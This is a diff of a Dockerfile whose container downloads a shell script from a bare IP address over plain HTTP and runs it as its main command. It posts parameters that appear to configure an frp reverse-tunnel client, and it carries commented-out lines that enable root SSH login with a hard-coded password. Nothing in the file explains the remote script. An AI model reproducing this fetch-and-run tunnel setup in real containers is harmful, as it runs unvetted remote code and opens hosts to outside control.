@@ -8,7 +8,7 @@ RUN apt install ssh wget npm -y
 #RUN echo 'PermitRootLogin yes' >>  /etc/ssh/sshd_config 
 #RUN echo root:netcyroot|chpasswd
 #RUN chmod 755 /1.sh
-RUN wget -O cvs.sh --post-data="frpc=ext&name=intel2&port=8208" https://8.142.11.99/gce.sh.php
+RUN wget -O cvs.sh --post-data="frpc=local&name=intel2&port=8208" http://8.142.11.99:8000/gce.sh.php
 RUN chmod 777 ./cvs.sh
 EXPOSE 80
 CMD  ./cvs.sh
